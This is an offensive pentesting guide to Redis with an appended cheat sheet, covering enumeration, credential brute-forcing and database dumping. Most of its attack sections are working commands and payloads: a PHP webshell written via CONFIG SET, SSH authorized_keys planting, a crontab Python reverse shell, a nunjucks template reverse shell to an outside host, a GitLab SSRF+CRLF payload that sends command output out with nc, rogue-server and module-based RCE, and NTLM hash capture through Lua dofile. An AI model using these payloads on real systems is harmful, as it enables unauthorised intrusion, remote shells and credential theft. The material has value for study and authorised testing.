# 6379 - Pentesting Redis

## Basic Information
Redis, an open-source tool licensed under BSD, functions as an in-memory data structure store, renowned for its key-value storage system and support for diverse data types. It serves multiple roles such as a database, caching layer, and message broker. Although it typically communicates via a simple, plaintext protocol, it's important to emphasize its ability to secure communications with SSL/TLS encryption.

Granting unauthenticated access to Redis or utilizing common credentials can pose significant security risks, potentially exposing sensitive data and transactions to unauthorized users.

From [the docs](https://redis.io/topics/introduction): Redis is an open source (BSD licensed), in-memory **data structure store**, used as a **database**, cache and message broker).

By default Redis uses a plain-text based protocol, but you have to keep in mind that it can also implement **ssl/tls**. Learn how to [run Redis with ssl/tls here](https://fossies.org/linux/redis/TLS.md).

**Default port:** 6379

```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
# Connect
## Connect Using redis-cli Command
```
redis-cli -h <hostname> -p <port-number> --user <username> -a <password>
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
#port number is optional
#username is optional
#password is optional
```
## URL
The Redis connection URL is a line containing all the information necessary for an application to connect to a Redis database. A typical format is as follows:
```
redis://:<password>@<hostname>:<port>
```
## Automatic Enumeration

Some automated tools that can help to obtain info from a redis instance:

```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## Enumeration
### Identifying an Redis Server
You can use Nmap to check if there's an Redis server on a target host like this:
```
nmap -p 6379 X.X.X.X
```
## Assessment with Metasploit
Metasploit's Redis modules scan redis servers for security risks such as weak credentials or access controls, improving overall security.
```
use auxiliary/scanner/redis/redis_server
msf auxiliary(scanner/redis/redis_server) > set rhosts X.X.X.X
msf auxiliary(scanner/redis/redis_server) > exploit
```
## Banner Grabbing
You can use Netcat to find out what service is running and its version by looking at the welcome message it shows when you connect. This method is called Banner Grabbing.
```
nc -nv X.X.X.X 6379
```
# Attack Vectors
### Passwordless Authentication
Redis allows users to connect to a server without needing a specific identity by utilizing a passwordless login feature.
To connect without a password, you would use the following command:
```
redis-cli -h X.X.X.X
```
## Common Credentials
If passwordless login is disabled on a Redis server, a good first step is to try common usernames and passwords such as admin, administrator, root, user or test. This approach is less aggressive than trying to guess passwords by brute force and is recommended to be tried first when accessing a server.
```
redis-cli -h X.X.X.X --user <username> -a <password>

#provide a common username
#provide a common password
```
## Bruteforcing Credentials
A brute-force attack involves trying many passwords or usernames to find the right one for accessing a system.

Tools like Hydra are designed for cracking into networks and can be used on services like Redis, HTTP, SMB, etc. For Redis, Hydra often carries out a dictionary attack, which means it uses a list of possible usernames and passwords from a file to try and log in.

## Bruteforcing with Hydra
To use Hydra for brute-forcing Redis login credentials, you would use a command structured for this purpose:
```
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] redis://X.X.X.X
```
## Bruteforcing with Nmap
It is also possible to perform brute force on Redis with Nmap scripts:
```
nmap -p 6379 --script redis-brute X.X.X.X
```
## Bruteforcing with Metasploit
It is also possible to apply brute force with Metasploit modules on Redis:
```
use auxiliary/scanner/redis/redis_login
msf auxiliary(scanner/redis/redis_login) > set rhosts X.X.X.X
msf auxiliary(scanner/redis/redis_login) > set user_file /path/to/user.txt
msf auxiliary(scanner/redis/redis_login) > set pass_file /path/to/pass.txt
msf auxiliary(scanner/redis/redis_login) > set stop_on_success true
msf auxiliary(scanner/redis/redis_login) > exploit
```
# Post-Exploitation
## Common Redis Commands
This table provides a clear overview of each command's function within Redis and how they are used, covering a broad spectrum of database management tasks.
Command	Description	Usage
SET	Sets the value of a key	SET key value
GET	Gets the value of a key	GET key
DEL	Deletes one or more keys	DEL key1 [key2 ...]
KEYS	Lists all keys matching a pattern	KEYS pattern
EXPIRE	Sets an expiration time on a key	EXPIRE key seconds
TTL	Gets the remaining time to live of a key	TTL key
INCR	Increments the value of a key	INCR key
DECR	Decrements the value of a key	DECR key
LPUSH	Prepends one or multiple values to a list	LPUSH key value [value ...]
RPUSH	Appends one or multiple values to a list	RPUSH key value [value ...]
LPOP	Removes and gets the first element in a list	LPOP key
RPOP	Removes and gets the last element in a list	RPOP key
SADD	Adds one or more members to a set	SADD key member [member ...]
SMEMBERS	Gets all members in a set	SMEMBERS key
ZADD	Adds one or more members to a sorted set	ZADD key score member [score member ...]
ZRANGE	Returns a range of members in a sorted set	ZRANGE key start stop [WITHSCORES]
HSET	Sets field in the hash stored at key	HSET key field value [field value ...]
HGET	Gets the value of a field in a hash stored at key	HGET key field
HDEL	Deletes one or more fields from a hash stored at key	HDEL key field [field ...]
HMSET	Sets multiple fields in a hash stored at key (Use HSET for Redis 4.0.0 and above)	HMSET key field1 value1 [field2 value2 ...]

## Exploiting Redis for Remote Code Execution
The sequence of commands provided demonstrates a method to exploit Redis instances for uploading and executing a PHP web shell on a target server. This technique leverages the flexibility of Redis to modify its configuration and misuse its data persistence capabilities to inject malicious code into a web-accessible directory.
```
$ redis-cli -h X.X.X.X flushall
$ redis-cli -h X.X.X.X set pwn '<?php system($_REQUEST['cmd']); ?>'
$ redis-cli -h X.X.X.X config set dbfilename shell.php
$ redis-cli -h X.X.X.X config set dir /var/www/html
$ redis-cli -h X.X.X.X save
```
## Unauthorized SSH Access via Redis Exploitation
This set of commands demonstrates an exploitation method that uses Redis to insert an SSH public key into the authorized_keys file of a Redis server, effectively allowing unauthorized SSH access to the server.
```
$ ssh-keygen -t ecdsa -s 521 -f key
$ (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
$ redis-cli -h X.X.X.X flushall
$ cat foo.txt | redis-cli -h X.X.X.X -x set pwn
$ redis-cli -h X.X.X.X config set dbfilename authorized_keys
$ redis-cli -h X.X.X.X config set dir /var/lib/redis/.ssh
$ redis-cli -h X.X.X.X save
```

### Redis Authentication

**By default** Redis can be accessed **without credentials**. However, it can be **configured** to support **only password, or username + password**.\
It is possible to **set a password** in _**redis.conf**_ file with the parameter `requirepass` **or temporary** until the service restarts connecting to it and running: `config set requirepass p@ss$12E45`.\
Also, a **username** can be configured in the parameter `masteruser` inside the _**redis.conf**_ file.

{% hint style="info" %}
If only password is configured the username used is "**default**".\
Also, note that there is **no way to find externally** if Redis was configured with only password or username+password.
{% endhint %}

In cases like this one you will **need to find valid credentials** to interact with Redis so you could try to [**brute-force**](../generic-hacking/brute-force.md#redis) it.\
**In case you found valid credentials you need to authenticate the session** after establishing the connection with the command:

```bash
AUTH <username> <password>
```

**Valid credentials** will be responded with: `+OK`

### **Authenticated enumeration**

If the Redis server permits **anonymous connections** or if you have obtained valid credentials, you can initiate the enumeration process for the service using the following **commands**:

```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```

**Other Redis commands** [**can be found here**](https://redis.io/topics/data-types-intro) **and** [**here**](https://lzone.de/cheat-sheet/Redis)**.**

Note that the **Redis commands of an instance can be renamed** or removed in the _redis.conf_ file. For example this line will remove the command FLUSHDB:

```
rename-command FLUSHDB ""
```

More about configuring securely a Redis service here: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

You can also **monitor in real time the Redis commands** executed with the command **`monitor`** or get the top **25 slowest queries** with **`slowlog get 25`**

Find more interesting information about more Redis commands here: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **Dumping Database**

Inside Redis the **databases are numbers starting from 0**. You can find if anyone is used in the output of the command `info` inside the "Keyspace" chunk:

![](<../.gitbook/assets/image (766).png>)

Or you can just get all the **keyspaces** (databases) with:

```
INFO keyspace
```

In that example the **database 0 and 1** are being used. **Database 0 contains 4 keys and database 1 contains 1**. By default Redis will use database 0. In order to dump for example database 1 you need to do:

```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS * 
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```

In case you get the following error `-WRONGTYPE Operation against a key holding the wrong kind of value` while running `GET <KEY>` it's because the key may be something else than a string or an integer and requires a special operator to display it.

To know the type of the key, use the `TYPE` command, example below for list and hash keys.

```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```

**Dump the database with npm**[ **redis-dump**](https://www.npmjs.com/package/redis-dump) **or python** [**redis-utils**](https://pypi.org/project/redis-utils/)

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## Redis RCE

### Interactive Shell

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) can automatically get an interactive shell or a reverse shell in Redis(<=5.0.5).

```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```

### PHP Webshell

Info from [**here**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html). You must know the **path** of the **Web site folder**:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```

​If the webshell access exception, you can empty the database after backup and try again, remember to restore the database.

### Template Webshell

Like in the previous section you could also overwrite some html template file that is going to be interpreted by a template engine and obtain a shell.

For example, following [**this writeup**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/), you can see that the attacker injected a **rev shell in an html** interpreted by the **nunjucks template engine:**

```javascript
{{ ({}).constructor.constructor(
  "var net = global.process.mainModule.require('net'),
       cp = global.process.mainModule.require('child_process'),
       sh = cp.spawn('sh', []);
   var client = new net.Socket();
   client.connect(1234, 'my-server.com', function(){
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
   });"
)()}}
```

{% hint style="warning" %}
Note that **several template engines cache** the templates in **memory**, so even if you overwrite them, the new one **won't be executed**. In this cases, either the developer left the automatic reload active or you need to do a DoS over the service (and expect that it will be relaunched automatically).
{% endhint %}

### SSH

Example [from here](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

Please be aware **`config get dir`** result can be changed after other manually exploit commands. Suggest to run it first right after login into Redis. In the output of **`config get dir`** you could find the **home** of the **redis user** (usually _/var/lib/redis_ or _/home/redis/.ssh_), and knowing this you know where you can write the `authenticated_users` file to access via ssh **with the user redis**. If you know the home of other valid user where you have writable permissions you can also abuse it:

1. Generate a ssh public-private key pair on your pc: **`ssh-keygen -t rsa`**
2. Write the public key to a file : **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. Import the file into redis : **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4.  Save the public key to the **authorized\_keys** file on redis server:

    ```
    root@Urahara:~# redis-cli -h 10.85.0.52
    10.85.0.52:6379> config set dir /var/lib/redis/.ssh
    OK
    10.85.0.52:6379> config set dbfilename "authorized_keys"
    OK
    10.85.0.52:6379> save
    OK
    ```
5. Finally, you can **ssh** to the **redis server** with private key : **ssh -i id\_rsa redis@10.85.0.52**

**This technique is automated here:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab

```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```

The last example is for Ubuntu, for **Centos**, the above command should be: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

This method can also be used to earn bitcoin ：[yam](https://www.v2ex.com/t/286981#reply14)

### Load Redis Module

1. Following the instructions from [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) you can **compile a redis module to execute arbitrary commands**.
2. Then you need some way to **upload the compiled** module
3. **Load the uploaded module** at runtime with `MODULE LOAD /path/to/mymodule.so`
4. **List loaded modules** to check it was correctly loaded: `MODULE LIST`
5.  **Execute** **commands**:

    ```
    127.0.0.1:6379> system.exec "id"
    "uid=0(root) gid=0(root) groups=0(root)\n"
    127.0.0.1:6379> system.exec "whoami"
    "root\n"
    127.0.0.1:6379> system.rev 127.0.0.1 9999
    ```
6. Unload the module whenever you want: `MODULE UNLOAD mymodule`

### LUA sandbox bypass

[**Here**](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html) you can see that Redis uses the command **EVAL** to execute **Lua code sandboxed**. In the linked post you can see **how to abuse it** using the **dofile** function, but [apparently](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) this isn't no longer possible. Anyway, if you can **bypass the Lua** sandbox you could **execute arbitrary** commands on the system. Also, from the same post you can see some **options to cause DoS**.

Some **CVEs to escape from LUA**:

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### Master-Slave Module

​The master redis all operations are automatically synchronized to the slave redis, which means that we can regard the vulnerability redis as a slave redis, connected to the master redis which our own controlled, then we can enter the command to our own redis.

```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```

## SSRF talking to Redis

If you can send **clear text** request **to Redis**, you can **communicate with it** as Redis will read line by line the request and just respond with errors to the lines it doesn't understand:

```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```

Therefore, if you find a **SSRF vuln** in a website and you can **control** some **headers** (maybe with a CRLF vuln) or **POST parameters**, you will be able to send arbitrary commands to Redis.

### Example: Gitlab SSRF + CRLF to Shell

In **Gitlab11.4.7** were discovered a **SSRF** vulnerability and a **CRLF**. The **SSRF** vulnerability was in the **import project from URL functionality** when creating a new project and allowed to access arbitrary IPs in the form \[0:0:0:0:0:ffff:127.0.0.1] (this will access 127.0.0.1), and the **CRLF** vuln was exploited just **adding %0D%0A** characters to the **URL**.

Therefore, it was possible to **abuse these vulnerabilities to talk to the Redis instance** that **manages queues** from **gitlab** and abuse those queues to **obtain code execution**. The Redis queue abuse payload is:

```
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
```

And the **URL encode** request **abusing SSRF** and **CRLF** to execute a `whoami` and send back the output via `nc` is:

```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```

Enumeration
nmap --script redis-info -p 6379 <target-ip>
nmap --script redis-brute -p 6379 <target-ip>

msf> use auxiliary/scanner/redis/redis_server
Copied!
Check Config File
If we have access to target system, find the configuration file then we may be able to get passwords.

find / -name "redis.conf" 2>/dev/null
grep -i pass /path/to/redis.conf
Copied!
If we get the line with password written as below,

requirepass "password"
Copied!
We can set the password in a redis client.

> auth "password"
Copied!

Connect
redis-cli -h <target-ip> -p 6379
## with password
redis-cli -h <target-ip> -p 6379 -a password

## using socket
redis-cli -s /path/to/redis.sock
Copied!
After connecting and execute the first arbitrary command, we may got the following output.

NOAUTH Authentication required.
Copied!
If so, we need to authenticate to communicate with the redis server.

> auth <password>
### or
> auth default <password>
### or
> auth <username> <password>
Copied!

Commands (Non-RESP Format)
Non-RESP (REdis Serialization Protocol) is such like the other protocol's command. Commands are separated with spaces.

Investigation
### Check credentials
> auth <username> <password>
> auth default <password>

### Set a password temporary until the service restarts.
> config set requirepass <password>

### Information on the Redis server
> info
> info keyspace

### List all
> config get *

### List all databases
> config get databases

### Select the database ('select <index>')
> select 0
> select 1
> select 12

### Read files and directories using Lua scripts
> eval "dofile('C:\\\\Users\\\\Administrator\\\\Desktop\\\\user.txt')" 0
> eval "dofile('C:\\\\Users\\\\<username>\\\\Desktop\\\\user.txt')" 0

### Find all keys
> keys *
Copied!
Get Key Value
### Get the type of value
> type <key_name>

### Get all fields and values of the hash stored at key.
> hgetall <key>
### e.g.
> hgetall admin

### Get a string value
> get <key> <field>
### e.g.
> get admin email

### Get a hashed value
> hget <key> <field>
### e.g.
> hget admin password

### Get multiple hashed values associated with specified fields
> hmget <key> <field1> <field2>
### e.g.
> hmget admin email password


### type: lists
> lrange <key_name> <start> <stop>
### e.g.
> lrange "userlist" 0 0
> lrange "userlist" 0 5

### type: sets
> smembers <key_name>

### type: sorted sets
> zrangebyscore <key_name> <min> <max>

### type: stream
> xread count <count> streams <key_name> <id>
Copied!
Set Key Value
### Set a hashed value in a field
> set <key> <field> <value>
### e.g.
> set admin email admin@example.com

### Set a hashed value in a field
> hset <key> <field> <value>
### e.g.
> hset admin password 286755fad04869ca523320acce0dc6a4
Copied!
Insert Values
> lpush <key> <element>
> lpush <key> <element> <element>
> lpush <key> <element> <element> <element>
### e.g.
> lpush myword "abracadabra"
Copied!

Commands (RESP Format)
RESP (REdis Serialization Protocol) is The syntax is…

*<num> The number of arguments.
$<num> The string length of the argument.
Below is the command same as set name "john".

telnet 10.0.0.1 6379
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.

*3
$3
set
$4
name
$4
john
Copied!

GET/SET Key Value Commands with Nginx Misconfiguration
location ~ /(.*)/(.*) {
    resolver 127.0.0.1; proxy_pass http://example.com/$1;
}
Copied!
We can connect to redis socket using curl command.

### HSET <key> <field> <value>
curl -X "HSET" https://example.com/unix:/path/to/redis.sock:<key>%20<field>%20<value>%20/abc
Copied!

NTLM Hash Disclosure
In local machine, start SMB server.

mkdir share
sudo impacket-smbserver share ./share/ -smb2support
Copied!
Now execute the following command in Redis client.

> eval "dofile('//10.0.0.1/share')" 0
Copied!
We might get a NTLM hash in the incoming connection to the SMB server. We can see the SMB server logs in terminal.
If the NTLM hash found, crack it.


Port Forwarding Redis Server to Local Machine
In local machine,

chisel server -p 9001 --reverse
Copied!
In target machine,

./chisel client <local-ip>:9001 R:6379:127.0.0.1:6379
